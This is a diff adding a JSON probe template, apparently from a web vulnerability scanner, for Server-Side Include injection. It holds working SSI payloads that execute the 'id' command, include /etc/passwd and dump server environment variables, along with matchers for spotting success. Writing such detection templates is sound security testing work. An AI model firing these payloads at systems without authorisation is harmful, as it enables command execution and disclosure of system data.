@@ -1,0 +1,51 @@
+{
+  "category": "ssi_injection",
+  "contexts": {
+    "command_execution": {
+      "description": "Server-Side Include injection -- inject SSI directives to execute commands or include files on servers with mod_include enabled",
+      "tech_match": ["Apache", "Nginx", "IIS"],
+      "param_match": ["name", "title", "comment", "message", "search", "query", "input", "text"],
+      "probes": [
+        {
+          "payload": "<!--#echo var=\"DATE_LOCAL\" -->",
+          "description": "SSI date probe -- if server processes SSI directives, the current date replaces the directive text",
+          "matchers": [
+            {"type": "not_word", "words": ["<!--#echo"]},
+            {"type": "status", "status": [200]}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "<!--#exec cmd=\"id\" -->",
+          "description": "SSI command execution -- exec directive runs OS command if SSI is enabled with exec permission",
+          "matchers": [
+            {"type": "word", "words": ["uid=", "gid="], "condition": "or"},
+            {"type": "not_word", "words": ["<!--#exec"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70
+        },
+        {
+          "payload": "<!--#include virtual=\"/etc/passwd\" -->",
+          "description": "SSI file inclusion -- include directive reads local files if path validation is weak",
+          "matchers": [
+            {"type": "word", "words": ["root:x:0:0:", "root:!:0:0:"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 65
+        },
+        {
+          "payload": "<!--#printenv -->",
+          "description": "SSI environment dump -- printenv directive outputs all server environment variables",
+          "matchers": [
+            {"type": "word", "words": ["SERVER_NAME", "DOCUMENT_ROOT", "HTTP_HOST", "PATH"], "condition": "or"},
+            {"type": "not_word", "words": ["<!--#printenv"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        }
+      ]
+    }
+  }
+}
